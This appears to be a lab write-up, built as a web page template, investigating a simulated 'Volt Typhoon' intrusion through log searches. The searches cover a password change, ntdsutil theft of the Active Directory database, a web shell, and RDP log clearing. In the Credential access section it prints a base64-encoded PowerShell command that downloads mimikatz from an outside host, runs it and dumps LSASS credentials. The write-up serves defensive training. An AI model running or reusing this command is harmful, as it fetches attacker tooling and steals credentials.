{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Initial Access", "initial-access")}}

{{text("We begin by learning at what time was <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Dean's</code> password changed.")}}

{{text("In the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>action_name</code> field we choose <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Password Change</code> and add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>dean-admin</code> as the username filter.")}}

{{image("../../static/writeups/volttyphoon/images/000001.jpg")}}

{{text("We reduced the number of events to two and get our answer.")}}

{{image("../../static/writeups/volttyphoon/images/000002.jpg")}}

{{text("Now we find the newly created user. I searched for the least popular user which was <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>voltyp-admin</code> and submitted him as the answer.")}}

{{image("../../static/writeups/volttyphoon/images/000003.jpg")}}

{{header("Execution", "execution")}}

{{text("Nextly, what command does the attacker run to find information about drives on server01 and server02?")}}

{{text("Simple, we just enter <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>server01</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>server02</code> into the search and get our command.")}}

{{image("../../static/writeups/volttyphoon/images/000004.jpg")}}

{{text("Then the attacker uses ntdsutil to copy the Active Directory database and archives it.")}}

{{text("We enter <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ntdsutil</code> into our search bar and get one result.")}}

{{text("From the command we see that the attacker created a directory at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>C:\Windows\Temp</code>, made a backup of the AD database and saved it in that folder path as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>temp.dit</code>")}}

{{text("Let's now search directly for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>temp.dit</code>")}}

{{text("We get 3 hits, and the first one contains the password we are looking for.")}}

{{image("../../static/writeups/volttyphoon/images/000005.jpg")}}

{{header("Persistence", "persistence")}}

{{text("The attacker created a webshell using base64 encoded text, in which directory was the web shell saved?")}}

{{text("Since we know  already that the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>C:\Windows\Temp\</code> path was created by the attacker, I decided to investigate it further.")}}

{{text("I stumbled upon a lot of hits, copying csv files, user browser profiles, saving files on the other server, but there was also a base64 string which we were looking for that got saved into a new file.")}}

{{image("../../static/writeups/volttyphoon/images/000006.jpg")}}

{{header("Defense evasion", "defense-evasion")}}

{{text("Now we have to discover what cmdlet did the attacker use to remove RDP logs from the computer.")}}

{{text("I searched for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Terminal Server Client</code> which I knew that contained information about RDP connections, specifically the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Default</code> registry key.")}}

{{image("../../static/writeups/volttyphoon/images/000007.jpg")}}

{{text("We see that <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>HKCU:\Software\Microsoft\Terminal Server Client\Default</code> gets put into a variable <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>$registryPath</code> which is a little weird, so I investigated further.")}}

{{text("After searching for that variable, we get the answer to the question.")}}

{{image("../../static/writeups/volttyphoon/images/000008.jpg")}}

{{text("Next question asks us about the backup file of AD database from before, we simply search for the file from before.")}}

{{image("../../static/writeups/volttyphoon/images/000009.jpg")}}

{{header("Credential access", "credential-access")}}

{{text("Now we need to find three pieces of software that the attackers try to get.")}}

{{text("Since it is a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>reg</code>, we simply search for that.")}}

{{image("../../static/writeups/volttyphoon/images/000010.jpg")}}

{{text("Now we are asked for another decoded command, meaning we should probably search for a base64 encoded string.")}}

{{text("After a couple of tries, I got the encoded string by searching for a powershell command that was executing something.")}}

{{image("../../static/writeups/volttyphoon/images/000011.jpg")}}

{{console("echo \"SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ=\" | base64 -d", "")}}

{{header("Discovery and lateral movement", "discovery-and-lateral-movement")}}

{{text("We search for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wevtutil</code> which was used by the attackers to search for security logs.")}}

{{image("../../static/writeups/volttyphoon/images/000012.jpg")}}

{{text("Next question asks us about <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>server-02</code> which I stumbled upon before while exploring the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>C:\Windows\Temp</code> path.")}}

{{image("../../static/writeups/volttyphoon/images/000013.jpg")}}

{{header("Collection", "collection")}}

{{text("And the last question is about the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.csv</code> that i also saw in the same path.")}}

{{image("../../static/writeups/volttyphoon/images/000014.jpg")}}

{{script()}}
